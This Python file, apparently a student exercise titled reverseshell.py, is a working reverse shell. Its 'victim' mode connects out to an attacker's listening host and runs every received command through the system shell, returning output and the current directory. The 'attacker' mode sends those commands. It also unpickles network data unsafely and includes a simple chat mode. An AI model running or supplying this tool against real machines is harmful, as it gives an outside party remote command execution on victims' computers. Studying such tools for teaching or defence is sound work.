#Ming Hong - 2201741782

import sys
import getopt
import ipaddress
import socket
import subprocess
import os
from threading import Thread
import pickle

PORT = 0
TARGET = ""
COMMAND = False
LISTEN = False
SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def victimExecute(Con):
    while True:
        try:
            msg = Con.recv(4096).decode()
        except KeyboardInterrupt:
            break
        if msg == 'exit':
            sys.exit(0)
        elif msg[:2] == 'cd':
            os.chdir(msg[3:])
        else:
            process = subprocess.Popen(msg, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            stdout, stderr = process.communicate()
            if stdout == b'':
                current_dir = os.getcwd().encode()
                d = {'res':stderr,'dir':current_dir}
                res = pickle.dumps(d)
                Con.send(res)
            else:
                current_dir = os.getcwd().encode()
                d = {'res':stdout,'dir':current_dir}
                res = pickle.dumps(d)
                Con.send(res)


def attackerRequest(Con):
    print(os.getcwd(),end='')
    while True:
        try:
            print('>',end='')
            command = input('')
            if command == 'exit':
                Con.send(command.encode())
                print('[*] Connection closed')
                break
            else:
                Con.send(command.encode())
        except:
            break

def attackerReceiveRequest(Con):
    while True:
        try:
            msg = Con.recv(4096)
        except:
            break
        if msg == '':
            break
        try:
            d = pickle.loads(msg)
            print(d['res'].decode(),end='')
            print(d['dir'].decode(),end='')
        except EOFError:
            break



def receiveMessage(Receiver):
    while True:
        msg = Receiver.recv(4096)
        if msg == b'':
            break
        if(msg.decode()=='exit'):
            break
        print('----------------------------------------------')
        print(msg.decode())
        print('----------------------------------------------')
        print('Message to send:')

def sendMessage(Sender):
    while True:
        try:
            msg = input('Message to send:\n')
            Sender.send(msg.encode())
            if(msg=='exit'):
                break
        except:
            break

def victim():
    global TARGET,PORT,SOCK,COMMAND
    if COMMAND:
        SOCK.connect((TARGET, PORT))
        victimExecute(SOCK)
        SOCK.close()
    else:
        SOCK.connect((TARGET, PORT))
        print('[*] Connection has been established')
        send = Thread(target=sendMessage,args=(SOCK,))
        receive = Thread(target=receiveMessage,args=(SOCK,))
        send.start()
        receive.start()
        send.join()
        receive.join()
        SOCK.close()

def attacker():
    global SOCK,PORT,TARGET,COMMAND
    if COMMAND:
        SOCK.bind(('',PORT))
        SOCK.listen(10)
        print('[*] Waiting for connection...')
        Victim, Address = SOCK.accept()
        print(f'[*] Connection has been established | {Address[0]}:{PORT}')
        asr = Thread(target=attackerRequest, args=(Victim,))
        arr = Thread(target=attackerReceiveRequest, args=(Victim,))
        asr.start()
        arr.start()
        asr.join()
        arr.join()
        SOCK.close()
    else:
        SOCK.bind(('', PORT))
        SOCK.listen(1)
        print('[*] Waiting for connection...')
        Victim, Address = SOCK.accept()
        print(f'[*] Connection has been established | {Address[0]}:{PORT}')

        send = Thread(target=sendMessage,args=(Victim,))
        receive = Thread(target=receiveMessage,args=(Victim,))
        send.start()
        receive.start()

        send.join()
        receive.join()
        SOCK.close()


#1
def main():
    global PORT,TARGET,COMMAND,LISTEN
    if(len(sys.argv)==1):
        print("Usage :")
        print("reverseshell.py -p [port] -l")
        print("reverseshell.py -t [target_host] -p [port]")
        print("reverseshell.py -p [port] -l -c")
        print("reverseshell.py -t [target_host] -p [port] -c")
        print("\nDescription:")
        print("-t --target - set the target")
        print("-p --port - set the port to be used (between 10 and 4096)")
        print("-l --listen - listen on [target]:[port] for incoming connections")
        print("-c --command - initialize a command shell")
        print("\nExample:")
        print("revershell.py -p 8000 -l")
        print("revershell.py -t 127.0.0.1 -p 8000")
        print("revershell.py -p 8000 -l -c")
        print("revershell.py -t 127.0.0.1 -p 8000 -c")
        sys.exit(0)
    try:
        opts, _ = getopt.getopt(sys.argv[1:],"t:p:c",['target=','port=','command'])
    except getopt.GetoptError:
        opts, _ = getopt.getopt(sys.argv[1:],"p:lc",['port=','listen','command'])
    for key,value in opts:
        if key == '-p' or key=='--port':
            try:
                value = int(value)
            except:
                print('Port must be numeric!')
                sys.exit(1)
            if value <10 or value >4096:
                print('Port must between 10 and 4096!')
                sys.exit(1)
            else :
                PORT = value
        elif key == '-l' or key == '--listen':
            LISTEN = True
        elif key == '-c' or key == '--command':
            COMMAND = True
        elif key== '-t' or key == '--target':
            try:
                ipaddress.ip_address(value)
                TARGET = value
            except ValueError:
                print('Target must be a valid ip address format!')
                sys.exit(1)
    if LISTEN:
        attacker()
    else:
        victim()

if __name__ == "__main__":
    main()